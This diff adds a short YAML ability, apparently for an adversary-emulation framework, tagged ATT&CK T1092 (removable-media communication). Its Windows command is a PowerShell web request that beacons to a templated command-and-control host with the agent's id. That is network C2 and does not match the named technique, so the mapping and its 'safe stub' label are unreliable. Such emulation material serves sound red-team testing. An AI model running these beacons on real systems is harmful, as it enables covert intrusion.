@@ -1,0 +1,14 @@
+- id: 8f2fb9ee-92a0-4b42-add1-3b28daeb51a3
+  name: Communication Through Removable Media
+  description: Ability for Communication Through Removable Media (ATT&CK T1092). Generated
+    from Atomic Red Team procedures; review and test safely before use. [AUTO-INFERRED
+    SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1092
+    name: Communication Through Removable Media
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
